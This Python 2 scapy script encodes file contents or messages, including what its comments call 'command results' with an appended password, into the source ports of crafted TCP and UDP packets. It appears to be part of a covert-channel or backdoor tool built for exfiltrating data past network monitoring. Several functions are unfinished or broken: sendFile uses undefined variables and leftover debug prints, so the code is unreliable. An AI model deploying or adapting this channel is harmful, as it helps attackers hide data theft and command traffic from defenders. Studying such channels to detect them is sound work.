from scapy.all import *
import binascii, time, os
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

maxPort = 65535

# take string and break it into chunks of length size
def chunkString(size, string):
  chunkedString = [string[i:i+size] for i in range(0, len(string), size)]
  return chunkedString

def createPacketTwo(protocol, ip, char1, char2):
    # get the binary values of both chars without the binary string indicator
    binChar1 = bin(ord(char1))[2:].zfill(8)
    binChar2 = bin(ord(char2))[2:].zfill(8)
    print binChar1 + binChar2
    # get the integer value of the concatenated binary values
    intPortVal = int(binChar1 + binChar2, 2)
    print "bin value " + str((bin(intPortVal)))
    # craft the packet
    if protocol == 'tcp':
        packet = IP(dst=ip)/TCP(dport=8000, sport=maxPort - intPortVal)
    elif protocol == 'udp':
        packet = IP(dst=ip)/UDP(dport=8000, sport=maxPort - intPortVal)
    return packet

# create a packet when we only have 1 character remaining in the file
# works exactly the same as createPacketTwo except we only have one character
# returns a TCP packet created by scapy.
def createPacketOne(protocol, ip, char):
    # get the binary value of the character
    binChar = bin(ord(char))[2:].zfill(8)
    #print binChar
    #get the integer value of that binary value
    intPortVal = int(binChar, 2)
    # craft the packet
    if protocol == 'tcp':
        packet = IP(dst=ip)/TCP(dport=8000, sport=maxPort - intPortVal)
    elif protocol == 'udp':
        packet = IP(dst=ip)/UDP(dport=8000, sport=maxPort - intPortVal)
    return packet

# create a packet containing one character hidden in the source port
def createPacket(protocol, ip, char, port):
    # get the binary value of the character
    binChar = bin(ord(char))[2:].zfill(8)
    #print binChar
    #get the integer value of that binary value
    intPortVal = int(binChar, 2)
    # craft the packet
    if protocol == 'tcp':
        packet = IP(dst=ip)/TCP(dport=port, sport=maxPort - intPortVal)
    elif protocol == 'udp':
        packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
    return packet

# need comment
def parsePacket(packet):
    sport = packet.sport
    difference = maxPort - sport
    binVal = bin(difference)[2:]
    binLen = len(binVal)
    if binLen > 8:
        # binary string contains two ascii characters
        # the last 8 characters in the string are always the 2nd character
        binChar2 = binVal[-8:]
        # python trims leading zeroes at the start of our concatenated binary string
        binChar1 = binVal[0:binLen - 8]
        char1 = chr(int(binChar1, 2))
        char2 = chr(int(binChar2, 2))
        #print "Received: " + char1 + char2
        return str(char1 + char2)
    else:
        # binary string contains one ascii character
        char = chr(int(binVal, 2))
        #print "Received: " + char
        return str(char)

# open a file in binary mode and return a string of the binary data
def sendFile(ip, filePath, protocol, port):
  fileSize = os.path.getsize(filePath)
  try: # read the file byte by byte rather than reading the entire file into memory
    with open(filePath, 'rb') as fileDescriptor:
      data = 'a'
      while data:
        data = fileDescriptor.read(2)
        print "test"
        if fileDescriptor.tell() == fileSize:
          print "we can use tell"
        # we need the '1' + ... because python will trim the leading character if it's a zero
        data = bin(int('1' + binascii.hexlify(bytes), 16))[3:].zfill(8)
        # send to IP address here
        packet = createPacket(protocol, ip, byte, port)
        send(packet, verbose=0)
  except IOError:
    print "file error"
  print "done"

# we should pass the encrypted password + string (command results or something else)
def sendMessage(message, password, protocol, ip, port):
  lastIndex = len(message) - 1
  for index, char in enumerate(message):
    packet = createPacket(protocol, ip, char, port)
    if index ==  lastIndex:
      print "last packet"
      packet = packet/Raw(load=password)
    send(packet, verbose=0)
    time.sleep(0.1) # we should check if this is actually necessary
